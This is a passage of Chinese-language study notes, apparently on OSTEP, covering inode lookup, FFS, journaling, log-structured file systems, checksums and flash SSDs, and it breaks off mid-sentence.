问：操作系统如何将路径转化成 inode 索引号？ 答：从每级目录的数据块中遍历下一级目录或文件的 inode 编号 只要给定一个 inode 编号，文件系统就可以计算出它在磁盘上的位置（通过起始地址+偏移量计算得到磁盘扇区编号）； 由于磁盘的存储单位是扇区，一般为 512 字节，而此处块的大小为 4KB，二者不同，因此需要做一个换算； inode 对象中包含有关于文件的一些元数据，包括读写权限、用户名、组名、创建&#x2F;修改&#x2F;访问&#x2F;删除时间、硬链接计数、块数量、磁盘指针等信息； 多级索引必须考虑的一个现实问题是文件在磁盘上的存储有可能是不连续的，即存储文件的块，有可能并不全部挨到一起；解决该问题有两种方法： 间接指针：为每个存储块分配一个指针，如果文件很大，意味着指针将很多，inode 肯定是存放不下了，因此一般在 inode 中存放 12 个直接指针（直接指向数据块），加一个间接指针（指向另外一个专门用于存放指针的块，每个块可以放 1024 个指针，即可以指向 1024 个块，每个块 4KB 的存储空间，1024 * 4KB &#x3D; 4MB）；该方案的好处是存储位置非常灵活，没有限制，随便组合都行；缺点是对于特别大的文件，需要花很多块用来存放指针；例如 4GB 的文件意味着需要 1024 * 1024 个块，单这些块就需要占去 1MB 的空间（注意：此处已经引入了双重间接指针，即第一级和第二级指针指向的块，都是存储指针，而不是数据）；对于更大的文件，还可以考虑引入三重甚至四重间接指针； 范围指针：对于连续的块，用一个头部指针 + 一个长度范围来表示；优点：对于大文件，不再需要那么多的块，比较省空间； 目前大多数文件系统都使用了多重间接指针索引的方式来存储文件，并且在 inode 中包含一定数量的直接指针；之所以这么指针，其原因在于大部分的文件都是一些小文件，因此 12 个左右的直接指针一般就够用了，只有少数大文件，才会用到间接指针； 除了间接指针和范围指针外，还有另外一种存储文件的方式是使用链表，将下一个数据块的地址，存放在当前块的末尾；不过这种设计在应对文件内容的随机访问场景时，力有不逮，性能很差，因为需要完全扫描完整个块，才能得到下一个块的地址； 目录组织目录的内容是由元组组成的列表，每个元组中包含关于目录中的文件或子目录的基本信息，如 inode 号、元组的长度、文件名称的长度、文件名称； 当目录中的文件很多时，列表将会很长，因此目录也需要存储在数据块中，并且在 inode 表同样会有一条 inode 记录指向该数据块；因此，目录在本质上其实就是一个特殊类型的文件而已；它的类型信息会标记在 inode 记录中； 由于目录的元组列表在数据块中是连续性存储的，当目录中的某个文件被删除时，其对应的元组将被标记为删除（例如将 inode 号标记为 0）；但是其占用的空间仍然存在，只是该空间现在变成可用的了；如果后续有新的文件写入该目录，就可以利用该空间，重新写一条关于新文件的元组记录； 这么说来，目录中的内容条目并不是按顺序存储的，而是无序的； 由于目录的元组以列表方式存储，这意味着它不能快速定位到某个文件对应的元组记录在第几个，需要从头开始扫描；当目录中的文件少的时候还好，如果文件非常多，则会有一点时间成本； 也有其他一些文件系统如 XFS，不是采用元组列表的形式来存储信息，而是采用 B 树的方式，这使得其扫描速度要快得多； 空闲空间管理管理空闲空间的动作是必须的，因此这样当有新文件需要写入时，才知道将它存放到哪些空闲的数据块上；管理空闲空间的方式有很多种，例如位图、空闲链表（跟内存有点像）、B 树；不同的方式在时间和空间上面各有其优缺点； 为了让数据尽量连续存储，有些文件系统，如 ext2\\ext3，在为新文件寻找空闲数据块时，会尽量一次寻找多个（例如 8 个）的连续空闲块，这样有助于后续提高文件的读定性能； 一个块有 4KB，8 个空闲块有 32 KB，一个扇区有 512B，因此 8 个空闲块约等于 64 个扇区；那么问题来了：磁盘在读取扇区数据时，一次性读入多少个扇区到缓存中？ 访问路径：读取和写入 读取当访问某个路径下的文件时，例如 open(“&#x2F;foo&#x2F;bar”)，实际发生的动作如下： 读取根目录的 inode 内容（在 UNIX 系统中，根目录的 inode 编号固定为 2，因此可以很快根据偏移计算出其磁盘地址）； 从根目录的 inode 对象中，得到其指向的数据块地址；（该数据块保存着根目录下的文件或子目录的元组列表）； 将根目录的数据块内容读取到内存中，遍历它，找到 foo 的 inode 编号，计算出 foo 的 inode 磁盘地址； 从 foo 的 inode 对象中，得到其指向的数据块地址； 将 foo 目录数据块内容读取到内存中，遍历它，找到 bar 的 inode 编号，计算出 bar 的 inode 磁盘地址； 读取 bar 的 inode 对象内容到内容中，检查读写权是否无误； 若无误，返回一个文件描述符，指向该内存地址，完成 open 的调用； 当文件打开后，调用 read() 时，实际发生的动作如下： 从 inode 对象中，获取指向的数据块地址；默认从编号为 0 的数据块开始读取（除非调用过 lseek 更改了偏移量）； 更新 inode 的最后访问时间字段为当前时间； 读取后，更新文件描述符对象中的当前数据块编号，以便下次读取时，可以从上次读取结束后的位置继续； 写入旧文件将数据写入到磁盘还是涉及挺多动作的，除了跟读取一样，将路径先转换成 inode 外，接下来还涉及： 读取数据位图，为新数据分配某个空闲块； 更新数据位图，标记该空闲块的状态为“已占用”； 读取 inode； 添加新的 inode 数据块指针，让其指向刚分配的空闲数据块地址； 将数据写入数据块； 创建新文件以上仅仅是写入数据到一个已存在的文件，如果是创建一个新文件，则涉及的动作还更多一些，包括： 读取 inode 位图，寻找空闲 inode； 将某个空闲 inode 位标记为已使用； 为新文件创建一个 inode 对象，将 inode 对象写入到 inode 表； 读取文件所在目录的 inode，找到其指向的数据块； 向目录的数据块中增加一条记录，映射新建的文件名和它的 inode 编号； 如果目录的数据块已满，则需要分配新的目录数据块，因此还需要读取数据块位图，寻找空闲块，并更新目录的 inode 对象，添加指向新数据块的指针； 缓存和缓冲由于在读写文件时，有很高的磁盘 I&#x2F;O 成本，因此，为了提高性能，引入了缓存机制，即在内存中，划分一片区域作为缓存；在首次读取时，将数据放入到缓存中；由于局部性现象的存在，后续的读取，大概率会命中缓存，而无须发生额外的磁盘 I&#x2F;O； 另外还引入了延迟写入的策略，每隔一段固定的时间，将缓存中的新数据，写入到磁盘上，这种策略有以下几个好处： 如果某个块被多次写入，则最后只发生一次 I&#x2F;O； 如果某个块最后被删除了，则完全没有发生 I&#x2F;O； 待写入的数据暂时放在缓存中，意味着后续对该块的读写，可以直接读取缓存，无须通过 I&#x2F;O 再次访问存储设备； 一般来说，延迟写入的时间间隔为 5-30 秒，但是它有一个缺点，即在写入之前，如果系统崩溃和停机了，待写入的数据将会丢失；有些应用程序对此无法容忍，例如数据库程序，因此它会直接调用 fsync 实现立即写入，避免延迟； 32.局部性和快速文件系统 FFS 早期的 UNIX 系统使用以上结构的文件系统设计，它本质上是将整个磁盘当作一个随机存取的内存来对待（但磁盘跟内存有所不同，内存的随机存取是很快的，但磁盘有寻道成本）；这个设计的好处在于它实现起来非常简单；缺点是随着使用时间的推移，最终将会导致文件的存储变得非常碎片化，从而带来很多的磁盘寻道定位成本（这也是当年为什么会有磁盘碎片整理工具这种东西出现的原因）； 问：如何设计和组织文件系统使用的数据结构，以提高访问性能？以及如何设计分配策略？ FFS：磁盘意识解决办法也很简单，老式 UNIX 文件系统设计的问题在于将整个磁盘当作随机存取的内存使用，因此，有必要反其道而行之；由于暴露给用户的抽象是文件和目录；目录是让用户组织其文件的一种方式；这意味着用户天然会将相同组别的文件放在同一个目录中，而且由于局部性原理，用户在访问下一个文件的时候，跟上一个文件在相同目录的概率比较大； 接下来 FFS 要做两件事情： 将磁盘按柱面分成多个柱面组（很有点类似目录的味道；按柱面的原因在于相同柱面的寻道时间比较短）； 每个柱面组内部像是一个小磁盘，由一个超级块副本+两个位图+数据块组成（跟上章的简单文件系统一模一样）； 将相同目录下的文件，尽量放在同一个组中，避免跨组；（为了让各个目录尽量分散在所有组中，FFS 在放置新目录时，会特意寻找分配数量少的柱面组） 大文件例外分组的另一点核心思想在于让各目录尽量平均分配到不同的组中，避免出现目录的存储出现跨组，不然就失去了局部性所能够带来的好处；但对于特别大的文件来说，它有可能会填满整个组并跨到下一个组，这样就破坏了局部性； 解决这个问题的方法之一是将大文件平均分配到各个组中，而不是在单个组中存储；当然，这样不可避免会带来多次的寻道成本，但这里面会有一个折中，即为了实现预期的传输带宽，应该将单组中的块设置为多大； 目前 FFS 的策略简单而粗暴，它将 inode 的 12 个直接指针指向的数据块和 inode 放在同一组，余下的每一个间接块，跟其指向的数据块，单独放在一个组；不同的间接块，放在不同的组（如果块的大小为 4KB 的话，磁盘地址为 32 位 4 个字节的话，则有 1024 个指针，其指向的数据块的总存储容量为 4MB）； 关于 FFS 的其他几件事子块当块的大小设置为 4KB 时，有利于提高缓存的命中率，从而提高磁盘的读取性能；但是如果磁盘上大量的文件都只有 2KB 的话，将意味着每个 4KB 的块中，都只有一半的空间得到利用，最终结果将导致磁盘的容量利用率只有预期的一半；解决思路是额外引入另外一种小规格的块（称为子块，sub-block），例如大小为 512B 的块，当某个文件少于 2KB 时，文件系统就为其分配子块；如果后续随着时间推移，文件变大了，则继续为其分配更多的子块，直到其大小达到 4KB 后，再为其分配规格为 4KB 的正常块，并将子块的数据复制过去；当然，这种方法带来了复制的成本，不过由于存在延迟写入的机制，这种复制通常只会发生在内存上，而不是在磁盘上； 磁盘缓存当块在磁盘上是按编号顺序连续性存储的时候，将会带来一个问题，即当文件系统发出块 0 的请求后，再次发送块 1 的请求时，磁盘已经放置到块 1 的位置了，而磁盘解析请求本身是需要时间的，因此将错过块 1，需要再完整的放置一周后，才能重新定位到块 1；为了解决这个问题，早期的思路是让块在磁盘上进行跳跃布局，这样可以为解析磁盘请求争取到时间；不过跳跃性布局也会带来一个问题，即最多只能得到磁盘一半的带宽，因为块是间隔存储的；后来现代磁盘引入了磁道缓冲区技术，即在其内部增加了单独的缓存，每次将整个磁道的数据读取到缓存中，这样就不需要担心旋转的问题了； 33.崩溃一致性：FSCK 和日志 问：对于某条数据写入请求，磁盘上数据更新操作是有多个步骤的，而不是原子性的，例如需要分别更新位图、inode 记录、数据块等步骤；当在更新过程中，突然机器出现断电或系统崩溃时，文件系统如何让磁盘上的数据保持一致性的状态，而不是部分写入，部分未写入，导致冲突错误？ 方案一：FSCKFSCK，file system check，文件系统检查；思路很简单，当由于断电或操作系统崩溃等错误发生时，文件系统先啥也不做；然后等再次被操作系统挂载并可用之前，做一次检查，修复之前的错误； FSCK 相当于做了整个磁盘的扫描工作，包括检查超级块、空闲块、inode 状态、inode 链接、重复指针、坏块指针、目录引用等；虽然这种检查方法是有效的，但是性能代价太高昂了，尤其是对于越来越大的磁盘，每次检查将花去几分钟甚至是几小时的时间；实现的目标仅仅某次写入涉及可能存在错误的3个块而已，很不值得； 方案二：日志思路是在将数据写入磁盘之前，将本次要实现的操作，提前单独写在某个指定的地方，形成日志；这样在遇到崩溃的场景时，就可以从日志中提取原来要实现的操作，并检查这些操作是否按预期完成了，如果没有，就重复执行一遍相关的操作，确保它们完成； 数据日志当发生文件的写入时，一般会涉及三个块需要更新，包括 inode、位图、数据块；物理日志的方式，是将这三个块的内容完整的写到日志中，并在其前后各包含一个标识开始 TxB 和结束 TxE 的事务块 TxB：Transaction Begin；TxE：Transaction End； 为了应对在日志写入过程中，出现断电或崩溃的场景，需要将日志的写入分成两部分，先写入头部和三个块，完成后，再写入事务的结束块，并将结束块的大小设置为 512 B，因为这个大小的块，磁盘的写入是原子性的；整个过程的顺序如下： 日志写入：事务头部块和三个块 日志提交：事务的结束块； 加检查点：将三个块写入磁盘； 恢复系统崩溃会在两个时间点下发生： 日志提交前：忽略该段日志，数据丢失； 日志提交后：重放该段日志，按日志对磁盘再做一次操作，数据未丢失； 批处理日志更新写日志的动作其实增加了额外的磁盘 I&#x2F;O，因为除了更新文件和目录的块外，现在又要多一次更新日志块的动作了；为了避免因此带来的性能问题，通常的做法是先将日志数据缓存在内存中，形成一条全局事务，然后每隔一段时间，做一次批处理的更新，而不是每条日志事务单独更新一次磁盘； 如何在批量更新日志时，发生了崩溃，那么日志的内容将会丢失，如果此时有数据正在写入，貌似也会丢失？ 循环日志日志的内容会不断累积，最终超过磁盘容量， 为了避免这个问题，可以通过增加一个日志超级块，加完检查点后，每隔一段时间，将已完成检查点的日志标记为空闲可重用的状态； 元数据日志物理日志存在两个方法的问题： 由于每个数据块需要写入磁盘两次（一次写在日志中，一次写在目标位置中），使得带宽只剩下原来的一半； 日志和目标位于不同的磁道，因为带来了额外的寻道时间成本； 解决办法：不将数据块写日志，只将元数据部分的内容写到日志中；（此种机制下，貌似需要先将数据写入数据块，之后再来写日志） 莫非这就是传说中的逻辑日志？ 棘手的情况：块复用 删除文件和目录时，将带来一场噩梦！想一想，它会发生什么？ 当采用元数据日志的模式时，数据块并没有写入日志，只将元数据写在了日志中；这意味着，与目录有关的更新由于都属于元数据，因此都会写在日志中；当用户在某个目录中添加某个文件时，由于目录的元数据会产生更新，因此，日志中有一条关于该目录更新的日志； 假设之后用户删除了整个目录，并重新创建一个新文件，当采用元数据日志时，日志和该新文件的数据会首先写入磁盘，假设此时写入的位置复用了此前删除的目录的块，然后在日志提交后，系统发生了崩溃；根据原本的协议，系统在恢复后，用户预期应该能够得到崩溃前写入的数据； 但是，此时事情并不能如预期一样发生；因为日志中还有一条关于目录的更新会被重放，而且它发生在创建新文件的日志之前，这意味着在重放时，原本数据块上的新文件数据，将会被覆盖； 有两种办法可以避免该问题： 在某条日志被标记为空闲前（即日志对应的操作已顺利完成，日志块将被复用），避免涉及的块的重用； 日志引入一种新类型的撤销记录，删除目录使用该记录；当重放时，此种类型的记录不重放； 问题1：当删除一个文件时，会发生什么？当在操作过程中发生崩溃后，会发生什么？ 更新文件所在目录的数据块，删除文件的映射记录； 更新 inode 位图和数据块位图，标记为空闲； 以上几个动作需要打包成一个事务，写到日志中，以便确保操作是原子性的，避免文件系统出现不一致； 问题2：当删除一个目录时，会发生什么？当操作过程中发生崩溃后，会发生什么？ 扫描目录中所有映射条目，获取每个条目指向的 inode； 获取每个文件 inode 指向的数据块指针； 将所有文件对应的 inode 位图和数据块位图，标记为空闲； 将目录对应的 inode 位图和数据块位图，标记为空闲； 更新目录所在的父级目录的 inode 属性和元数据块，删除映射； 由于没有 TxE 块的事务是无效的，因此 TxB 块和元数据块写入日志的请求，和数据块的写入请求可以并行发出，重点是 TxE 块的写入请求需要等待前面三个请求完成后才可以发出； 其他方案除了 FSCK 和日志外，其他保持文件系统数据一致性的方案： 强制排序对写入进行强制排序，这样可以避免磁盘出现不一致状态，例如先写数据块，再写 inode； 写时复制copy-on-write；当发生写入时，不覆盖原文件或目录，而是写到空闲块，写完后更新目录结构，让指针指向新的位置；（如果写失败了，数据会丢失，但旧文件仍然保持一致性；貌似更新目录的操作需要是原子性的，避免更新一半的时候失败了）； 反向指针在数据块中添加一个指向 inode 的指针；当发生崩溃时，比对 inode 中的数据块指针，和数据块中的 inode 指针是否匹配（问：如何快速知道哪些写入的指针不匹配？）； 事务校验和不强制事务写入的顺序，而是通过事后计算校验和，来确定是否写入有效，执行成功；（此方法性能不错，但需要磁盘提供新接口； 问：如果在校验之前，系统发生崩溃会怎么样？ 答：写入被当作无效，这样文件系统中不会发生一致性问题，但数据将会丢失好像？ 34.日志结构文件系统 在读了原始论文后，我终于知道它为什么叫日志结构文件系统了，因为传统的文件是将日志做为一种辅助，临时存储目标数据，以便存储过程中发生崩溃时，可以从日志中恢复目标数据；但 LFS 则直接将目标数据存储在日志中，不再单独额外的存储一份目标数据，所以叫日志结构的文件系统，非常形象； 这样做有一个很大的好处是崩溃恢复非常快，无须做全盘检查，只需检查最后更新的那份日志即可；同时目标数据无形中得到了历史快照，可以任意恢复到某个历史版本（如果还没有被覆盖的话）； 寻道成本FFS 快速文件系统在日常场景中的性能并不是特别好，因此每做一次文件更新，需要做很多次磁盘 I&#x2F;O，虽然通过引入缓存，可以缓解这个问题，但这只是将多个 I&#x2F;O 一次性发给磁盘进行顺序优化，实质上仍然不可避免磁盘内部的寻道成本和旋转成本，因为每个磁盘 I&#x2F;O 并不是顺序写入；虽然这些写入由于分组的技术，通常在一个柱面组中，但仍然会带来短寻道和旋转延迟的成本； 考虑内存容量和磁盘传输速度在逐年增加，而寻道和旋转成本却进步缓慢，因此如果能够将文件系统改进为顺序写入，随着时间的推移，将获得越来越大的性能优势； 日志结构文件系统，log-structure file system 名称的由来在于它将整个磁盘当做一个循环日志来对待，就像写日志一样，每次新的写入，都写入到尾部，不覆盖旧数据；等日志写满了后，又重头开始写； 顺序写入解决这个问题的办法有两点： 根据磁盘传输速度，设置足够大的缓存，一次性积累足够多的待写入数据； 将数据发给磁盘做顺序写入，以获得磁盘最大的带宽速度（一般为峰值速度的 90%）； 以上方案的挑战： 顺序写入意味着不现更新和覆盖旧的数据块，而是永远将数据写到新的数据块中；这意味着 inode 的位置将随着每次写入不断的变换位置，需要解决如何定位最新版本的 inode 的问题；（当使用顺序写入的时候，inode 的内容更新同 FFS 并没有什么不同，区别在于将 inode 更新后的内容写入磁盘的时候；LFS 是写入到新的位置，FFS 覆写原来的位置；因此，对于文件原本已有的数据块，仍由 inode 中的原有的指针指向着，没有变化）； 如何定位由于 inode 的位置不断变化，因此需要有一个地方，保存指向最新版本的 inode 地址；LFS 使用 inode map（映射）来解决这个问题，类似于用 inode 编号和 inode 地址组成的键值对；给定一个 inode 号，根据映射将得到它的磁盘地址； 如果将 inode map 映射存储在某个固定的位置，则该位置在文件发生写入时，将不断避免的出现频繁更新，这样会增加寻道成本；因此将 inode map 也作为顺序写入数据的一部分，放置在 inode 右边；注意：imap 中保存着多个文件的映射信息，而不只是一个文件； 另外随着文件的增多，貌似 imap 的体积也会变得越来越大？怎么对应这个问题？另外是否需要标记已经删除的文件，回收 inode 编号？ 虽然 imap 和 inode 一起放置，解决了频繁更新 imap 造成的顺序写入破坏，但是它同样导致 imap 本身也不是不断变化位置的。归根结底，仍然需要有一个持久的数据结构，保存着最新版本的 imap 位置； 检查点区域解决定位 imap 的方案是引入一个检查点区域（CR，Checkpoint Region），它固定在磁盘的头部，其中保存着每个文件的 imap 地址； 由于随着文件写入时，检查点区域同样会出现频繁更新，因此为了避免由于带来的性能问题，它一般设置为每 30 秒更新一次，两次更新期间的数据先保存在内存中；这样就可以将多次 I&#x2F;O 变成一次 I&#x2F;O 了； 问：检查点区域是否存储着多个 imap？还是只有一个？好奇 CR 里面的内容长什么样子 答：CR 里面的内容包括 imap 所有块的地址、段使用表、时间戳、最后一个写入的段的指针； 读取文件当发生文件读取时，文件系统从检查点区域找到 imap 地址，然后根据地址，将整个 imap 加载到内存中；接下来，根据需要读取的文件的 inode 编号，从 imap 数据中查找到该文件的 inode 地址；根据 inode 地址，加载到文件的元数据，并根据其中的数据块地址，读取到文件中的数据； 处理目录当在磁盘上面创建一个文件时，不仅有文件数据需要写入磁盘，同时也需要更新目录数据；因此在顺序写入数据的时候，其实也在顺序写入待更新的目录数据，而由于目录的数据都是元数据，因此每次创建或更新文件，都一直在顺序写入目录中的所有内容（相当于目录的位置一直在发生变动）； 问题来了：根目录如何知道旗下各个子目录所在的映射区的位置？莫非映射区中保存着所有的文件和目录的 inode 映射？如果是这样的话，整个映射区就是一个完整的 inode 表； 如果映射块一直存放在内存中的话，那么读取起来的性能还是很快的； 映射区的设计，很好的规避了递归更新问题；每当创建一个文件时，文件所在的目录的 inode 也需要被更新，此时目录的新 inode 会和文件、新映射一起顺序写入磁盘的新位置；新映射中包含着目录 inode 的新位置，但该目录的 inode 编号并没有变，因此并不需要更新其父目录的 inode ； 从 imap -&gt; inode -&gt; 数据块的查找过程如下： 垃圾收集问题：由于每次更新文件和目录，都是写入新的位置，这不可避免会导致部分旧的数据块失效，变成垃圾块；如果放任不管的话，虽然这些垃圾块并没有指针指向它们，但是它们会在磁盘的空间中形成很多小洞，使用大段连续的空闲空间变得越来越少，从而在未来需要顺序写入的时候，找不到大段的连续空间；同时文件系统也需要额外的机制，来标记这些空闲小洞，负担很大； 解决步骤1：不将磁盘作为一个连续存储空间来处理，而是将其分成很多个段，以段为单位来写入数据；每次需要写入新数据时，即使原来的段没有满，也写到新的段中；这样一来就可以减轻空闲标记的工作（感觉跟内存的分页机制有点像）； LFS 在清理过程中，如果发现段中的部分数据块仍然是有效的，则会将多个段的有效数据合并复制到一个新的段中，然后将多个旧段回收； 突然发现内存有分段分页机制，磁盘也可以有；内存的分段对应不同数据，磁盘的分段对应不同目录均匀分页、相同目录尽量集中的原则； 解决步骤2：LFS 通过在数据块中增加一个头部，来解决空闲块标记的问题；这个头部包含两个信息，该数据块所属文件的 inode 编号，以及其在文件中的数据块索引号；基于这两样信息，文件系统可以到 imap 中找到当前 inode 块地址，并读取 inode 数据，核对相应索引号的数据块地址，看二者是否匹配；如果匹配，表示该块是活的，仍被 inode 指向；如果不匹配，则表示该块已经失效了，不再被 inode 指向，可以清理了； LFS 还偷偷的在数据块头部中写入了文件的版本号信息；当文件发生重大变更时，例如被删除时，LFS 会在文件的 inode 中更新其版本号字段；这样后续在核对是否匹配时，如果版本号不同，则可以直接判断数据块失效，无须再核对数据块地址了，节省了一些时间； 清理策略常见的思路有三种：定期、空闲时、磁盘已满； 崩溃恢复和日志对于 LFS，最重要的一点是保证 CR 检查点区域的更新是原子性的，只要这点保证了，貌似就不会产生一致性的问题；为了实现 CR 更新的原子性，LFS 的做法是建立两个 CR，分别位于磁盘的头部和尾部，交替更新它们，这样某次更新过程中出现崩溃，仍然有一份旧版本的 CR 可以使用； 在更新 CR 的时候，文件系统会先生成一个时间戳，写入 CR 起始位置，再写 CR 主体，最后再写入 CR 尾部；这样如果更新过程中发生了崩溃，文件系统通过比对头尾的时间戳，如果二者不一致，则表示当前的 CR 是无效的； 问：LFS 需要日志吗？如果需要的话，日志保存在哪里？ 答：貌似保存在 CR 中？假设文件系统每 30 秒将数据集中写入磁盘一次，则在写入完成前，如果发生崩溃，如果没有日志，这 30 秒的最新数据将会丢失；如果这个丢失是可以接受的话，则貌似不需要日志也是可以的； 预设前提LFS 的整个设计是建立在磁盘的寻道成本过高的前提下的，这对于磁盘存储设备来说是成立的，但是对于闪存存储类型的设备来说，情况则有所变化，寻道成本开始变得可以忽略不计了；不过 LFS 的设计倒是提供了一个额外的好处，即文件系统意外获得了快照，出现意外情况下非常方便恢复旧版本文件； 35.数据完整性和保护 问题：当数据写入磁盘后，如果确保当数据从磁盘读取出来时，跟之前写入的数据是一样的？ 磁盘故障模式 整个磁盘不工作了，stop and fail； 某个扇区不工作了，latent sector error； 某个块不工作了，block corruption； 整体来说，出现扇区故障和块故障的几率还是不小的： 项目 廉价 昂贵 扇区故障 9.4% 1.4% 块故障 0.5% 0.05% 处理潜在的扇区错误 问题：文件系统应如何处理潜在扇区错误？需要增加什么额外的机制，来处理该类型的错误？ 当出现扇区错误时，还是很容易在第一时间发现问题的；因为文件系统尝试读取某个块，但由于该块所在的扇区不工作了，因此不能正常的返回需要的数据，此时文件系统就会发现扇区出现了错误； 接下来只需要使用已有的冗余机制，例如 RAID-1 的镜像备份，或者 RAID-4&#x2F;5 的校验和，来重建损坏的扇区即可； 对于 RAID-4&#x2F;5 来说，如果在多个磁盘上出现相同的扇区损坏，则无法重建成功了； 检测块错误：校验和块错误跟扇区错误不同，它是一种无声的故障，因为当故障发生时，磁盘并不会报错，而只是悄悄的返回了非预期的数据； 问题：需要什么技术来检测无声的错误？如何有效的实现？ 常见的校验和函数异或 XOR实现：假设最终的校验和是 4 字节的，则将整个块分成多个以 4 字节为单位的段，给每段相同位置的字节做异或计算； 优点：实现起来非常简单； 缺点：如果同个位置有两个字节处理错误，则异或计算的结果会显示正常，导致错误无法被发现； 加法实现：对整个数据块执行二进制补码的加法，忽略溢出；因此只要有任何一个位或多个位的数据出现变化，整个加法的结果都将不同； 优点：实现简单； 缺点：如果数据出现移位，而不是翻转，则无法检查出错误； Fletcher 校验和实现：假设数据块 D 由 d1 至 dn 共 n 个字节组成；有两个校验字节 s1 和 s2，其中 s1 &#x3D; s1 + di mod 255 s2 &#x3D; s2 + di mod 255 优点：可以检测所有单比特和双比特的错误，以及大部分的突发错误； 缺点：计算稍复杂 循环冗余检验 CRC CRC 全称：cycle redundancy check； 实现：将数据块 D 视为一个大的二进制数，并将其除以约定的值 k，得到的余数即是 CRC 值； 检验和布局最终计算出来的检验和，需要在磁盘上安排一个位置来存储它，有两种方法： 磁盘厂商实现将原本 512 字节的块，实际设置为 520 字节，这样多出来的 8 个字节刚好用来存储校验和； 文件系统实现单独划分一个 512 字节的块用来存储校验和，每个校验和为 8 字节，因此 512 字节的块可以存储 64 个检验和，刚好对应其后的 64 个连续的数据块；不过这种方法有很大的缺点：即当某个数据块的数据发生改变时，需要同时更新校验和所在的块，增加了寻道、定位等 I&#x2F;O 成本； 使用校验和 使用方法很简单，在读取某个数据块时，同时读取在磁盘上存储的检验和，并与根据数据块计算出来的校验和进行比较， 如果二者一致，就返回数据给用户； 如果不一致，如果有冗余机制，尝试进行恢复；如果没有，则报告错误； 错误的写入位置 问题：磁盘在写入数据时，有可能将数据写入到一个错误的地址上 为了应对该类故障，可以在校验和添加物理标识符，例如磁盘序号和块号； 丢失的写入 问题：磁盘报告它成功的将数据写入了，但实际上并没有； 这是一个很蛋疼的问题，当发生此类故障时，前面提到的所有校验机制都将无效，因为块上的旧数据符合上面的任意一条校验规则；一种解决办法是引入写入验证，例如写入后马上读取，但是 I&#x2F;O 成本很高； 其他方法是在磁盘上的某个位置添加额外的校验和，例如在 inode 和间接块中，存储数据块的检验和，这样如果某个数据块没有成功写入，那么数据块里面的数据是旧的，其校验和跟 inode 中存储的校验和将不一致； 有一种极端情况是连 inode 中的校验和的写入也丢失了，这样就没有办法检验了；不过貌似数据块和 inode 的写入同时丢失是一个小概率事件，当然，任何小概率事件早晚都是有可能发生的； 不定期擦拭虽然当文件被访问时，检验和将会被核对；但问题是绝大多数的文件在写入后，就很少被访问了；而由于磁盘本身的物理特性，在使用一段时间后，其上面的块可能会自行发生变化，此时将导致检验和出错；随着时间的推移，错误将累积得越来越多，最终导致当发现错误时，恢复工作已经无法进行； 为了避免这个问题，磁盘系统一般会定期对所有数据块进行扫描，以便及时发现错误和修复，保持它们始终是正确干净的状态； 校验和的开销由于每 4KB 的数据块需要一个 8 字节的校验和，因此整体空间开销在 0.2%，是一个可接受的范围，成本很小；但是计算开销则比较大，因为现在每访问一个数据块，都需要对其做校验和的计算和比对工作； 为了降低 CPU 开销，需要特别优化，将数据块的复制和校验，组合一个单独的简化活动；另外定期的擦净工作一般选择在夜间进行，此时电脑处于低工作荷载的状态中； 36.基于闪存的 SSD特点与构造闪存有一个很有意思的特点，它在内部将存储单元分为块和页（块比页大）；当需要写入数据到某个块时，首先需要先将整个块的数据先删除掉，之后才能写入；而且，写入的次数是有上限的；因此，如果对某个页执行频繁的写入操作，将导致其很快老化； 猜测之所以需要先删除，是因为需要让该块处于某种重置后的状态，在该状态下，块可以被放入电子；但是当电子放入后，就会破坏这种状态，导致无法再额外放入或取出电子；如果要写入新数据，则只能将整个块重新初始化； 问：如何构建闪存 SSD？如果应对昂贵的擦除成本？如果重写会缩短磁盘寿命的话，如果构建持久使用的磁盘？ 闪存的基本存储原理，是通过存储在晶体管中的电子数量，来判断该比特位所存储的值的； 单层：如果电子数量超过某个临界值，则表示 1；反之表示 0； 双层：有多个电子数量的临界点，分别表示 00、01、10、11； 三层：原理同双层相似，差别在于可以表示 3 个比特位，即 000 ~ 111； 虽然层数越多，单个存储单元的容量越大，单位价格越低，但是性能会下降；单层的单位容量小，但性能最好； 从位到片显然 SSD 存储器操作的最小单元不可能是比特，而是一个更大的存储单元“页”；SSD 一般由多块存储片构成，每个存储片中有 n 个块；每个块中有 n 个页； 块大小：128 ~- 256KB（相当于 32 ~ 64 个页） 页大小：512B ~ 4KB； 以块为单位的操作闪存芯片一般支持三个低级别的操作： 读取（页）：给定页编号即可，非常快，没有寻道成本，随机读取和顺序读取的性能几乎相同，约 10 微秒； 擦除（块）：将数据写入指定页前，需要将页所在的块上面的数据全面清除，之后才能写入（原因很简单：闪存是以存储单元中的电子量来表示值的，因此需要先将存储单元设置成某个初始化状态，之后才能够正确的放入电子）；擦除的成本比较高，需要约 1 毫秒（跟读取的速度相差 100 倍）； 写入（页）：当某个块被擦除后，就可以开始往里面的页写入数据了；写入的时间成本约 100 微秒； 写入过程根据页号找到所在的块，此时整个块的状态为 VALID（表示其上面的数据可读）； 将块的状态变更为 ERASED（此时块上所有页中的存储单元，都会被置为 1）； 根据页号，将某个页中存储单元的电子量设置为预期的状态（设置成功即表示数据写入成功），写入完成后，该页的状态会从 ERASED 变成 VALID； 问：好奇剩下的三个页仍为 ERASED 状态，那么未来再向它们写入数据时，它们会处于什么样的状态？是否需要重置整个块？ 答：貌似剩下的三个页下次可以直接往里面写入数据；只有当需要向已经是 VALID 的存储单元写入数据时，才需要将整个块重置为 ERASED 状态； 性能与可靠性老化闪存由于全部是硅晶体管构成的，没有传统磁盘中的机械结构，因此它出现故障的可能要比传统磁盘低一些（例如肯定不会出现磁头撞到盘面的情况）；闪存主要的问题是老化，因为每次向存储单元写入数据时，是往里面放入电子；每次清除其中的电子时，都会有一些残留；随着时间的推移，这些残留会累积；当累积到一定的程度后，就很难用该存储单元的电子数量来区分它当前是处于 0 还是 1 的状态了，这个时候该存储单元便不再可用了； 闪存生产商的数据是单层 SLC 的可擦写次数大约在 10 万次，双层 MLC 大约在 1 万次（但目前还不是非常确定，因为第三方的实验数据发现寿命好像比预想的还要更长一些）； 干扰另外一个会影响可靠性的点是干扰；当某个存储单元被读取或写入时，有可能会干扰旁边存储单元中的电子数量；当干扰超过某个临界点时，会造成位翻转，导致单元中存储的值不再准确； 从存储片到 SSD 在 SSD 出现之前，传统机械磁盘已经和文件系统形成了成熟的接口，因此 SSD 需要提供向后的兼容性， 以便能够让文件系统无感知的使用 SSD； 为了实现向后的兼容性，SSD 提供了一个中间的翻译层 FTL，Flash Translation Layer；它负责提供跟传统机械磁盘一样的接口，供文件系统调用，并将其翻译成内部指令； 为了提高性能，SSD 